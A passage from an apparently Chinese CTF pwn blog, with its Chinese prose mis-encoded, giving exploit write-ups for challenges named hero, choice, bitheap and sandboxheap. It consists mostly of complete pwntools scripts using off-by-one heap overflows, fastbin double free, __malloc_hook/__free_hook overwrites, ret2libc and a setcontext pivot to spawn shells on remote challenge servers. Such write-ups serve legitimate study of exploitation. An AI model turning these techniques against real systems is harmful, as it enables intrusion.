class="hljs-string">b&#x27;quit&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) +  p64(<span class="hljs-number">0x4005e9</span>) + p64(<span class="hljs-number">0x400903</span>) + p64(bss) + p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hero"><a href="#hero" class="headerlink" title="hero"></a>hero</h3><p>åœ¨editå‡½æ•°ä¸­æœ‰ä¸ªå•å­—èŠ‚æº¢å‡º</p><p><img src="/img/3/Screenshot_20221105_120111.png"></p><p>å¯ä»¥ä¼ªé€ ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„prev_sizeå¤§å°å’Œsizeå°¾å­—èŠ‚ä¸º\x00ï¼Œåœ¨ç”³è¯·é‡Šæ”¾ä¼šæœ¬æ¥æ­£å¸¸ç”³è¯·çš„å †å—åˆå¹¶ã€‚</p><p>æœ€ååˆ©ç”¨fastbinäºŒæ¬¡é‡Šæ”¾ï¼ŒæŒ‡å‘malloc_hookï¼Œ<code>__realloc_hookæ”¹ä¸ºonegadget</code> ï¼Œ <code>__malloc_hookæ”¹ä¸º__libc_reallo</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hero&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc_64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./hero&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50005</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x170</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>libc_reallo = libcbase + <span class="hljs-number">0x846c0</span><br>onegadget = libcbase + <span class="hljs-number">0xf1117</span><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>edit(<span class="hljs-number">1</span> ,<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(p64(malloc_hook - <span class="hljs-number">0x23</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">11</span> + p64(onegadget) + p64(libc_reallo + <span class="hljs-number">6</span>)<br>add(payload ,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>æœ¬åœ°å¤ç°ç¯å¢ƒï¼š2.23-0ubuntu11.3_i386</p><p>åœ¨æ­¤è¾“å…¥æ—¶åˆ©ç”¨æœ€åä¸€ä¸ªå­—èŠ‚å³å¯è¦†ç›–nbytesçš„å€¼ï¼Œç„¶ååœ¨ä¸‹ä¸€æ¬¡è¾“å…¥æ—¶è®©å…¶æ ˆæº¢å‡ºï¼Œæœ€året2libc</p><p><img src="/img/3/Screenshot_20221105_104723.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./choice&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>pay = <span class="hljs-string">b&#x27;a&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x50&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(<span class="hljs-number">0x80485bb</span>) + p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>leak = u32(p.recv(<span class="hljs-number">4</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¥¥äº‘æ¯2022 sandboxheapå’Œbitheap</title>
    <link href="/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/"/>
    <url>/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘æ˜¯å…ˆå†™çš„sandboxheapï¼Œå¼€å§‹è¿˜ä»¥ä¸ºsandboxæ–‡ä»¶æ˜¯å¤šä½™çš„ï¼Œå°±ç›´æ¥å•ç‹¬æ‹¿sandboxheapå»å†™ï¼Œå°±åœ¨æœ¬åœ°æ‰“é€šåï¼Œå‘ç°è¿œç¨‹æ˜¯æœ‰é€šè¿‡sandboxå»æ‰§è¡Œsandboxheapï¼Œå½“æ—¶æˆ‘å°±æ²¡èƒ½å†™å‡ºæ¥ã€‚</p><p>å±±é‡æ°´å¤ç–‘æ— è·¯ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘ï¼æ²¡æƒ³åˆ°bitheapæ¼æ´å’Œsandboxheapä¸€æ¨¡ä¸€æ ·ï¼Œè€Œä¸”æ²¡æœ‰sandboxï¼Œå½“æ—¶å°±åªå†™å‡ºäº†bitheapã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¿™ä¸¤é“é¢˜éƒ½æ˜¯ä¸€æ ·çš„æ¼æ´ï¼Œä¸»è¦æ˜¯çœ‹æ‡‚ç¼–è¾‘å‡½æ•°ä¸­çš„æº¢å‡ºå’ŒåŠ å¯†ï¼š</p><p>å¦‚ä¸‹å›¾å°†å †å—å†™å…¥æ•°æ®çš„å¤§å°ä¹˜8 ï¼Œç„¶ååŠ 1ï¼›æœ€åæ˜¯é€šè¿‡åŸºäºè¾“å…¥çš„8ä¸ªå­—ç¬¦å»å¯¹å †ä¸­çš„ä¸€ä¸ªå­—èŠ‚è¿›è¡Œä½è¿ç®—ï¼Œæ¯ä¸ªå­—ç¬¦å¯ä»¥æ“ä½œå †ä¸­ä¸€ä¸ªå­—èŠ‚çš„ä¸€ä½ï¼›æœ€åä¼šå¤šå‡ºä¸€ä¸ªå­—èŠ‚å½±å“ä¸‹ä¸€ä¸ªå †å—çš„size</p><p><img src="/img/4/Screenshot_20221105_024929.png"></p><p>å¦‚ä¸‹å›¾sub_C61å‡½æ•°ï¼ŒåŸºäºå †å—ä¸­çš„å­—ç¬¦æ¥ä½è¿ç®—ï¼Œä½†å †å—åˆå§‹å€¼éƒ½æ˜¯<code>0</code>ï¼Œæœ€åè¢«å†™å…¥å †å—çš„ä¹Ÿæ˜¯0  ï¼›å¦‚æœè¾“å…¥çš„æ˜¯<code>\x31</code>å­—ç¬¦ä¼šè®©æœ€åè¢«å†™å…¥å †å—çš„çš„æ˜¯1ã€‚</p><p><img src="/img/4/Screenshot_20221105_025735.png"></p><h3 id="å †åˆ©ç”¨"><a href="#å †åˆ©ç”¨" class="headerlink" title="å †åˆ©ç”¨"></a>å †åˆ©ç”¨</h3><p>kaliå¯¹è¿™é“é¢˜ä½¿ç”¨patchelfä¼šæŠ¥é”™ï¼Œè¿™é‡Œæˆ‘æ˜¯ç”¨ubuntuå®Œæˆçš„</p><p>ç”±äºæº¢å‡ºçš„å­—èŠ‚åªèƒ½æ›´æ”¹ä¸‹ä¸€ä¸ªå †å—çš„sizeçš„æ ‡å¿—ä½ï¼ˆåˆ¤æ–­å †å—æ˜¯å¦è¢«ä½¿ç”¨ï¼‰ï¼Œéœ€è¦å¯¹ä¸‹ä¸€ä¸ªå †å—çš„prev_sizeå’Œæ ‡å¿—ä½ä¿®æ”¹ï¼Œè®©å…¶é‡Šæ”¾åè¿›å…¥unsortedbinï¼Œç„¶åä¸ä¸Šè¾¹çš„unsortedbinåˆå¹¶ã€‚</p><img src="/img/4/Screenshot_20221107_060716.png" style="zoom:80%;" /><p>å…·ä½“å†™å…¥</p><img src="/img/4/Screenshot_20221107_060903.png" style="zoom:80%;" /><h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><p>åˆ©ç”¨å †å—é‡å ç›´æ¥å»ä¿®æ”¹__free_hookä¸ºsystemå‡½æ•°å³å¯ã€‚</p><p>å®Œæ•´çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bitheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process([&#x27;./sandbox&#x27;,&#x27;./sandboxheap&#x27;])</span><br><span class="hljs-comment">#p = process(&#x27;./bitheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;39.106.13.71&#x27;</span>,<span class="hljs-number">42991</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    pay = u64(pay)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">1</span>, key(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">3</span>, key(p64(sys_addr)))<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h3><p>ä»¥å‰éƒ½æ˜¯å†™è°ƒç”¨prctlå‡½æ•°ï¼Œç¦æ­¢ç³»ç»Ÿè°ƒç”¨å¼€å¯çš„æ²™ç›’é¢˜ï¼Œä½†è¿™é¢˜ç›®ç›´æ¥ä½¿ç”¨æ²™ç›’ç¨‹åºæ¥ä¿æŠ¤å…¶å®ƒç¨‹åºã€‚</p><p>åˆ©ç”¨å †å—é‡å ä¿®æ”¹__free_hookåˆ°setcontextæ®µä¸Šï¼Œé‡Šæ”¾å †å—ä¼šæ‰§è¡Œsetcontextæ®µä¸Šçš„ä»£ç ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­rdiå°±æ˜¯è¢«é‡Šæ”¾å †å—å †å—çš„åœ°å€ï¼Œè¿›è€ŒåŠ«æŒrspã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f5b32c80085</span> &lt;+<span class="hljs-number">53</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa0</span>]<br>   <span class="hljs-number">0x00007f5b32c8008c</span> &lt;+<span class="hljs-number">60</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f5b32c80093</span> &lt;+<span class="hljs-number">67</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f5b32c80097</span> &lt;+<span class="hljs-number">71</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f5b32c8009b</span> &lt;+<span class="hljs-number">75</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f5b32c8009f</span> &lt;+<span class="hljs-number">79</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f5b32c800a3</span> &lt;+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f5b32c800a7</span> &lt;+<span class="hljs-number">87</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa8</span>]<br>   <span class="hljs-number">0x00007f5b32c800ae</span> &lt;+<span class="hljs-number">94</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f5b32c800af</span> &lt;+<span class="hljs-number">95</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f5b32c800b3</span> &lt;+<span class="hljs-number">99</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f5b32c800ba</span> &lt;+<span class="hljs-number">106</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f5b32c800c1</span> &lt;+<span class="hljs-number">113</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f5b32c800c5</span> &lt;+<span class="hljs-number">117</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f5b32c800c9</span> &lt;+<span class="hljs-number">121</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> 